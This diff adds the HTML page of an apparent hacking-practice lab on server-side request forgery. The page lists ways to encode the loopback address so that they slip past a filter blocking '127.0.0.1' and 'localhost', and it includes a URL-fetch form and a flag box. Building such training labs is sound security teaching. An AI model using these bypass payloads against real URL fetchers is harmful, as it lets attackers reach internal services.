@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SSRF Filter Bypass - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1>🌐 SSRF Filter Bypass</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span></div></div>
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>The filter blocks "127.0.0.1", "localhost", and "0.0.0.0". Bypass it using alternative representations.</p>
+    </div>
+    <div class="lab-section">
+      <h2><i class="fas fa-terminal"></i> Filtered URL Fetcher</h2>
+      <div class="vulnerable-form">
+        <input type="text" id="bypassUrl" placeholder="http://0x7f000001/" autocomplete="off">
+        <button onclick="bypassFetch()" class="btn">Fetch</button>
+      </div>
+      <div id="bypassResult" class="result-box" style="margin-top:1rem;"></div>
+      <div class="code-block">Bypass techniques:
+- Decimal: http://2130706433/  (127.0.0.1 as integer)
+- Hex: http://0x7f.0x0.0x0.0x1/
+- Octal: http://0177.0.0.01/
+- IPv6: http://[::1]/
+- DNS: http://127.0.0.1.nip.io/
+- Short: http://0/ or http://127.1/
+- URL encoding: http://127%2e0%2e0%2e1/</div>
+    </div>
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('ssrf-basic','flagInput_ssrf2','flagResult_ssrf2'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_ssrf2" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_ssrf2" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+  <script>
+    async function bypassFetch() {
+      const res = await fetch('/labs/ssrf/filter-bypass/fetch', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url:document.getElementById('bypassUrl').value}) });
+      document.getElementById('bypassResult').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
+    }
+  </script>
+</body>
+</html>
